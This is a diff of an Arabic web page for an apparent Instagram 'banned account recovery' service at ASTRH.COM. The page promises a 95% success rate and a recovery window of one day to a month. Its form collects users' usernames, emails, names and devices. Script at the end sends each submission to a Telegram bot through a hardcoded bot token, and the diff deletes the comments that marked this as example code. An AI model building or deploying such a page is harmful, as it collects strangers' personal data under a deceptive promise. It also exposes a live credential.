@@ -462,8 +462,8 @@
         </div>
         
         <section class="hero">
-            <h2>استرجاع حساب انستقرام المبند  خلال 24 ساعة</h2>
-            <p>نقدم خدمة استرجاع حسابات انستقرام المبنده باحترافية عالية ونسبة نجاح تتجاوز 95%. فريقنا يعمل على مدار الساعة لمساعدتك في استعادة حسابك.</p>
+            <h2>استرجاع حساب انستقرام المحظور خلال 24 ساعة</h2>
+            <p>نقدم خدمة استرجاع حسابات انستقرام المحظورة باحترافية عالية ونسبة نجاح تتجاوز 95%. فريقنا يعمل على مدار الساعة لمساعدتك في استعادة حسابك.</p>
         </section>
         
         <div class="form-container">
@@ -490,11 +490,11 @@
                 </div>
                 
                 <div class="form-group">
-                    <label for="banType"><i class="fas fa-ban"></i> نوع الباند</label>
+                    <label for="banType"><i class="fas fa-ban"></i> نوع الحظر</label>
                     <select id="banType" name="banType" required>
-                        <option value="">اختر نوع الباند</option>
-                        <option value="temporary">باند مؤقت</option>
-                        <option value="permanent">باند دائم</option>
+                        <option value="">اختر نوع الحظر</option>
+                        <option value="temporary">حظر مؤقت</option>
+                        <option value="permanent">حظر دائم</option>
                         <option value="disabled">تعطيل الحساب</option>
                         <option value="unknown">غير معروف</option>
                     </select>
@@ -502,7 +502,12 @@
                 
                 <div class="checkbox-group">
                     <input type="checkbox" id="noAppeal" name="noAppeal" required>
-                    <label for="noAppeal">أؤكد أنني لم أقدم طعنًا على الباند من قبل</label>
+                    <label for="noAppeal">أؤكد أنني لم أقدم طعنًا على الحظر من قبل</label>
+                </div>
+                
+                <div class="checkbox-group">
+                    <input type="checkbox" id="removeBan" name="removeBan" required>
+                    <label for="removeBan">أوافق على إزالة الحظر والالتزام بشروط الانستقرام</label>
                 </div>
                 
                 <button type="submit" class="submit-btn" id="submitBtn">
@@ -533,7 +538,7 @@
         </div>
         
         <footer>
-            <p>جميع الحقوق محفوظة © 2025 - <span>ASTRH.COM</span></p>
+            <p>جميع الحقوق محفوظة © 2023 - <span>ASTRH.COM</span></p>
             <p class="copyright">تصميم وتطوير: أسامة ليث</p>
         </footer>
     </div>
@@ -542,7 +547,7 @@
     <div class="message-popup" id="messagePopup">
         <div class="message-content">
             <h3>تم استلام طلبك بنجاح!</h3>
-            <p>تم استلام طلب استرجاع حساب الانستقرام الخاص بك، وسيتم فك الباند خلال فترة من يوم إلى شهر بسبب أعمال الصيانة التي يجريها انستقرام.</p>
+            <p>تم استلام طلب استرجاع حساب الانستقرام الخاص بك، وسيتم فك الحظر خلال فترة من يوم إلى شهر بسبب أعمال الصيانة التي يجريها انستقرام.</p>
             <p>سيتم إعلامك فور اكتمال عملية استرجاع الحساب.</p>
             <button class="close-btn" onclick="closeMessage()">موافق</button>
         </div>
@@ -593,7 +598,12 @@
             
             // التحقق من الموافقة على الشروط
             if (!document.getElementById('noAppeal').checked) {
-                alert('يجب الموافقة على أنك لم تقدم طعنًا على الباند من قبل');
+                alert('يجب الموافقة على أنك لم تقدم طعنًا على الحظر من قبل');
+                return;
+            }
+            
+            if (!document.getElementById('removeBan').checked) {
+                alert('يجب الموافقة على إزالة الحظر والالتزام بشروط الانستقرام');
                 return;
             }
             
@@ -623,12 +633,12 @@
                 spinner.style.display = 'none';
                 submitBtn.disabled = false;
                 
-                // إرسال البيانات إلى بوت التليجرام (هذا مثال، يحتاج إلى تعديل)
+                // إرسال البيانات إلى بوت التليجرام
                 const botToken = '7687440233:AAGuzoy9e64CdO5xu9aUL47AbtN1Tg65weg';
                 const chatId = '8197104189';
-                const message = `طلب استرجاع حساب انستقرام جديد:\n\nيوزر: ${formData.username}\nإيميل: ${formData.email}\nالاسم: ${formData.name}\nآخر جهاز: ${formData.device}\nنوع الباند: ${formData.banType}\nرابط الموقع: ${formData.website}`;
+                const message = `طلب استرجاع حساب انستقرام جديد:\n\nيوزر: ${formData.username}\nإيميل: ${formData.email}\nالاسم: ${formData.name}\nآخر جهاز: ${formData.device}\nنوع الحظر: ${formData.banType}\nرابط الموقع: ${formData.website}`;
                 
-                // هنا سيتم إرسال الرسالة إلى البوت (هذا كود مثال)
+                // إرسال الرسالة إلى البوت
                 fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
                     .then(response => response.json())
                     .then(data => {
@@ -663,4 +673,4 @@
         });
     </script>
 </body>
-</html>
+    </html>
